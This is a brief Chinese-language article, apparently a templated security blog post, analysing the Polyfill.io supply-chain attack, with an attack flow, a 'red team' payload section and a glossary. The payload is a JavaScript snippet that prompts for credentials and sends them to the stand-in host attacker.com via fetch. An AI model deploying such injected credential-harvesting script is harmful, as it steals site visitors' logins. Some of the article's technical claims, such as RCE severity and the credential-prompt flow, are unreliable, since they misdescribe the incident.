# 🚨 解析 Polyfill.io 供應鏈攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `JavaScript`, `Polyfill`, `Supply Chain Attack`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: Polyfill.io 的收購導致惡意程式碼被注入，影響使用 Polyfill.io 的網站，包括東芝和無印良品的網頁。這些網站在使用 Polyfill.io 的程式碼時，沒有進行適當的驗證和過濾，導致惡意程式碼被執行。
* **攻擊流程圖解**:
	1. 用戶訪問受影響的網站。
	2. 網站載入 Polyfill.io 的程式碼。
	3. 惡意程式碼被注入並執行。
	4. 用戶被提示輸入使用者名稱和密碼。
	5. 用戶輸入的資訊被蒐集和傳送給攻擊者。
* **受影響元件**: 所有使用 Polyfill.io 的網站，尤其是那些沒有及時更新和驗證程式碼的網站。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要控制 Polyfill.io 的網域和程式碼。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意程式碼範例
    const maliciousCode = `
      // 蒐集用戶輸入的資訊
      const userInput = prompt('請輸入使用者名稱和密碼');
      // 傳送資訊給攻擊者
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: userInput,
      });
    `;
    // 注入惡意程式碼
    document.body.appendChild(document.createElement('script')).text = maliciousCode;
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全措施，例如使用加密和混淆來隱藏惡意程式碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Polyfill**: 一種用來填補瀏覽器功能缺失的 JavaScript 程式碼函式庫。它可以讓網頁在舊環境中正常運行。
* **Supply Chain Attack**: 一種攻擊方式，攻擊者控制某個供應鏈中的節點，例如程式碼庫或網域，來注入惡意程式碼或蒐集敏感資訊。
* **JavaScript**: 一種用來創建動態網頁和網頁應用的程式語言。
